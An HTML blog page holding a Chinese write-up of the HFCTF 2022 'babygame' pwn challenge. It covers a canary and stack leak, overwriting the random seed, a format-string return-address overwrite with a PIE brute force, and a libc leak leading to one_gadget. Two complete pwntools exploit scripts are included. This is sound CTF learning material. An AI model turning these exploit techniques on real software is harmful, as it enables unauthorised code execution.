@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zikh26.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="总结：通过这道题的学习与收获有： 1、第一次尝试用爆破的方式来对抗PIE保护 2、重新温习了下猜数游戏这种类型的题目（思路就是想办法覆盖种子，自己跑个脚本） 3、做题没思路的时候，就先写个半成品脚本，动态调试一下，总能得到一些有用的信息。 4、格式化字符串这道题考察了一个payload里面，同时写和同时读。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="虎符CTF2022_babygame">
+<meta property="og:url" content="https://zikh26.github.io/2022/04/26/hfCTF2022_babygame/index.html">
+<meta property="og:site_name" content="ZIKH26">
+<meta property="og:description" content="总结：通过这道题的学习与收获有： 1、第一次尝试用爆破的方式来对抗PIE保护 2、重新温习了下猜数游戏这种类型的题目（思路就是想办法覆盖种子，自己跑个脚本） 3、做题没思路的时候，就先写个半成品脚本，动态调试一下，总能得到一些有用的信息。 4、格式化字符串这道题考察了一个payload里面，同时写和同时读。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121543040.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121546569.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121553302.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121600144.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121605256.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121609207.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121614047.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121619129.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121622331.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121626663.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121630124.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121634088.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121637907.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411121643381.png">
+<meta property="article:published_time" content="2022-04-26T02:48:05.026Z">
+<meta property="article:modified_time" content="2022-04-26T02:48:05.026Z">
+<meta property="article:author" content="ZIKH26">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="爆破">
+<meta property="article:tag" content="猜数游戏">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zikh26.github.io/upload/img/image-20220411121543040.png">
+
+<link rel="canonical" href="https://zikh26.github.io/2022/04/26/hfCTF2022_babygame/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>虎符CTF2022_babygame | ZIKH26</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ZIKH26</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">pwn</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/2022/04/26/hfCTF2022_babygame/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/20220411214643.jpg">
+      <meta itemprop="name" content="ZIKH26">
+      <meta itemprop="description" content="未来一位优秀的pwner的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZIKH26">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          虎符CTF2022_babygame
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-26 02:48:05" itemprop="dateCreated datePublished" datetime="2022-04-26T02:48:05+00:00">2022-04-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>总结：<br>通过这道题的学习与收获有：</p>
+<p>1、第一次尝试用爆破的方式来对抗PIE保护</p>
+<p>2、重新温习了下猜数游戏这种类型的题目（思路就是想办法覆盖种子，自己跑个脚本）</p>
+<p>3、做题没思路的时候，就先写个半成品脚本，动态调试一下，总能得到一些有用的信息。</p>
+<p>4、格式化字符串这道题考察了一个payload里面，同时写和同时读。</p>
+<span id="more"></span>
+
+<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/upload/img/image-20220411121543040.png" alt="image-20220411121543040"></p>
+<h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><p><img src="/upload/img/image-20220411121546569.png" alt="image-20220411121546569"></p>
+<p>发现了溢出点（不过程序开了canary)，并且有个srand函数，猜测应该题目是个猜数游戏，同时我们还可以控制seed。</p>
+<img src="/upload/img/image-20220411121553302.png" alt="image-20220411121553302" style="zoom:50%;" />
+
+
+
+<p>猜数的逻辑是随机生成一个数字（可能为0,1,2），如果是0，你就要输入1；如果是1，你就要输入2；如果是2，你就要输入0。否则的话就返回0，如果满足条件就继续循环，直至100次，如果全部满足条件就返回1。</p>
+<p><img src="/upload/img/image-20220411121600144.png" alt="image-20220411121600144"></p>
+<p>如果返回的是1，就可以进入这个sub_13F7函数，发现这个函数虽然没有溢出，但是存在一个格式化字符串漏洞。</p>
+<h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><p>首先考虑一个点，程序给了溢出点，如果不用就太可惜了。用的话就要先泄露canary。可以发现read后面紧接着有一个%s将buf所打印出来，很明显这里可以把canary给带出来。</p>
+<p>格式化字符串漏洞的威力很大，想利用的话，就要控制种子写个脚本跑一下即可进入存在格式化字符串漏洞的函数。</p>
+<p>为了不将%s打印的内容截断，我们考虑把read输入的内容全写成\x11，直到把canary的00给覆盖了（防止00截断%s）。</p>
+<p><img src="/upload/img/image-20220411121605256.png" alt="image-20220411121605256"></p>
+<p>发现canary存放的是var_18。</p>
+<p><img src="/upload/img/image-20220411121609207.png" alt="image-20220411121609207"></p>
+<p>read输入的buf在这里<img src="/upload/img/image-20220411121614047.png" alt="image-20220411121614047"></p>
+<p>因此offset&#x3D;0x120-0x18+1&#x3D;0x109（加1的目的是为了把canary的00给覆盖了）</p>
+<p>然后考虑下格式化字符串怎么用？如果只根据现在获取的信息的话，我也不知道怎么用，不过可以先把脚本写出来，调试一下，看看栈里面有没有可用的信息。</p>
+<p>半成品脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0x1435)\nc&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">lib=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">0x1111111111111111</span>)</span><br><span class="line">payload=<span class="number">0x109</span>*<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    v2=libc.rand()%<span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">0</span>:</span><br><span class="line">        v3=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">1</span>:</span><br><span class="line">        v3=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">2</span>:</span><br><span class="line">        v3=<span class="number">0</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(v3))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到现在已经进入到了存在格式化字符串漏洞的函数。</p>
+<p><img src="/upload/img/image-20220411121619129.png" alt="image-20220411121619129"></p>
+<p><img src="/upload/img/image-20220411121622331.png" alt="image-20220411121622331"></p>
+<p>有两个非常值得注意的点，也是这道题的突破口，就是栈里存了一个atoi偏移16的真实地址。我们有个格式化字符串漏洞，可以打印栈中数据（不过有个条件），倘若拿到了atoi的真实地址，我们就获得了libc基地址，然后就可以去搜一下one_gadget了。别忘了，格式化字符串是可以任意地址任意写的（尝试将返回地址写成one_gadget地址）。</p>
+<h2 id="问题与对策"><a href="#问题与对策" class="headerlink" title="问题与对策"></a>问题与对策</h2><p>那现在有几个问题要考虑一下。</p>
+<p>第一，格式化字符串打印栈中数据的前提是需要泄露栈地址，才可以打印指定的栈内容，怎么泄露栈地址？</p>
+<p>第二，拿到libc基地址，再发送one_gadget，就势必需要劫持函数的控制流，可是我们第二次的read是没办法溢出的。</p>
+<p>第三，怎么对抗PIE保护？</p>
+<h3 id="解释问题一："><a href="#解释问题一：" class="headerlink" title="解释问题一："></a>解释问题一：</h3><p><img src="/upload/img/image-20220411121626663.png" alt="image-20220411121626663"></p>
+<p>我们再次观察栈中的数据发现，canary被%s打印完之后，打印并不会停止（因为没有遇见00），因此下面的栈中数据也被泄露出来了，碰巧这个数据是个栈地址。因此我们只需要接收完canary之后，再接收6字节，就可以泄露栈地址了。</p>
+<h3 id="解释问题二："><a href="#解释问题二：" class="headerlink" title="解释问题二："></a>解释问题二：</h3><p>由于我们第一个read虽然可以溢出，但是我们只能去填充垃圾数据把canary和leak_stack_addr给带出来，因此没办法控制返回地址，第二个read没法溢出。那我们依旧<strong>考虑格式化字符漏洞，尝试用它去修改返回地址（我们完全可以这样做，因为我们已经拿到了泄露的栈地址）</strong>，修改返回地址为哪个地址？毋庸置疑，还得是第一个read的地址，因为我们要将one_gadget地址放到返回地址。当我试图将one_gadgeet地址写入返回地址时，突然意识到开启了PIE保护。</p>
+<h3 id="解释问题三："><a href="#解释问题三：" class="headerlink" title="解释问题三："></a>解释问题三：</h3><p>先看下PIE保护所造成的问题吧。</p>
+<p><img src="/upload/img/image-20220411121630124.png" alt="image-20220411121630124"></p>
+<p><strong>我现在试图将lea rax,[rbp-0x120]这个指令地址写入返回地址</strong>，可是发现由于PIE保护的原因，每次程序运行的时候，这个地址只有后三位不变，前面的内容都会改变。这种情况就很是尴尬，<strong>因为格式化字符串写的时候要么一次写一字节（两位），要么一次写两字节（四位）</strong>（这里就不考虑一次写四字节的情况了）</p>
+<p>因此我们根本没办法去正好控制后三位，那我们只控制后两位，让第三位去继承原本返回地址的内容？</p>
+<p>返回地址</p>
+<p><img src="/upload/img/image-20220411121634088.png" alt="image-20220411121634088"></p>
+<p>要修改成的地址<br><img src="/upload/img/image-20220411121637907.png" alt="image-20220411121637907"></p>
+<p>可以发现，这俩并不凑巧相同。那控制后四位（即两字节）？</p>
+<p><strong>控制后四位的话，我们确实可以定死后三位，但是倒数第四位由于PIE的原因，它是随机的</strong>，这条路行不通？</p>
+<p>经过我尝试了许多别的方法，无论如何也都走不通，最后我又拐回来想这条路，突然意识到一件事，只有仅仅是倒数第四位随机而已，<strong>如果爆破呢？我们就随便蒙一个倒数第四位，正确的概率是1&#x2F;16</strong>(已经不低了)(意思就是说每次PIE，使基址倒数第四位是随机的（后三位地址是固定的），我们可以蒙一个数，然后去运行程序，只要有一次运行的程序基址倒数第四位是我们蒙的数字，就说明我们此时爆破成功），此时就可以顺利返回到one_gadget的地址了。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">lib=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">    <span class="comment">#gdb.attach(p, &#x27;b * $rebase(0x1435)\nc&#x27;)</span></span><br><span class="line"></span><br><span class="line">    libc.srand(<span class="number">0x1111111111111111</span>)</span><br><span class="line">    payload=<span class="number">0x109</span>*<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">    canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        v2=libc.rand()%<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">0</span>:</span><br><span class="line">            v3=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">1</span>:</span><br><span class="line">            v3=<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">2</span>:</span><br><span class="line">            v3=<span class="number">0</span></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(v3))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;%42178c%9$hn&#x27;</span>+<span class="string">&#x27;aaaa&#x27;</span>+<span class="string">&#x27;%27$p&#x27;</span>+<span class="string">&#x27;aaa&#x27;</span>+p64(leak_addr-<span class="number">520</span>)</span><br><span class="line">    <span class="comment">#42178就是十六进制的a4c2,我赌倒数第四位是a   -&gt;.-&gt;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    atoi_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">16</span></span><br><span class="line">    libc_base=atoi_addr-lib.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    sys_addr=lib.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">    bin_sh_addr=lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()+libc_base</span><br><span class="line">    payload2=<span class="number">0x108</span>*<span class="string">&#x27;a&#x27;</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4f302</span> +libc_base)</span><br><span class="line">    p.send(payload2)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">times=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./a&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        p.interactive()</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        times += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">10</span>+<span class="built_in">str</span>(times)+<span class="string">&quot; times&quot;</span>+<span class="string">&quot;*&quot;</span>*<span class="number">10</span>)</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/upload/img/image-20220411121643381.png" alt="image-20220411121643381"><br>PS：这道题如果打远程的话，是需要用题目中给出的动态库，如果本地的话，用自己本地的动态库就行</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>ZIKH26
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://zikh26.github.io/2022/04/26/hfCTF2022_babygame/" title="虎符CTF2022_babygame">https://zikh26.github.io/2022/04/26/hfCTF2022_babygame/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+              <a href="/tags/%E7%88%86%E7%A0%B4/" rel="tag"># 爆破</a>
+              <a href="/tags/%E7%8C%9C%E6%95%B0%E6%B8%B8%E6%88%8F/" rel="tag"># 猜数游戏</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/26/huicheyingxiang/" rel="prev" title="探究pwntools中sendline的回车所造成的影响（什么时候用sendline，什么时候用send）">
+      <i class="fa fa-chevron-left"></i> 探究pwntools中sendline的回车所造成的影响（什么时候用sendline，什么时候用send）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/26/biji_diyizhang/" rel="next" title="第一章 计算机系统漫游（深入理解计算机系统笔记）">
+      第一章 计算机系统漫游（深入理解计算机系统笔记） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">保护策略：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">题目分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">3.</span> <span class="nav-text">做题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%B8%8E%E5%AF%B9%E7%AD%96"><span class="nav-number">4.</span> <span class="nav-text">问题与对策</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%87%8A%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">解释问题一：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%87%8A%E9%97%AE%E9%A2%98%E4%BA%8C%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">解释问题二：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%87%8A%E9%97%AE%E9%A2%98%E4%B8%89%EF%BC%9A"><span class="nav-number">4.3.</span> <span class="nav-text">解释问题三：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">5.</span> <span class="nav-text">exp</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ZIKH26"
+      src="/images/20220411214643.jpg">
+  <p class="site-author-name" itemprop="name">ZIKH26</p>
+  <div class="site-description" itemprop="description">未来一位优秀的pwner的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ZIKH26" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ZIKH26" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZIKH26</span>
+</div>
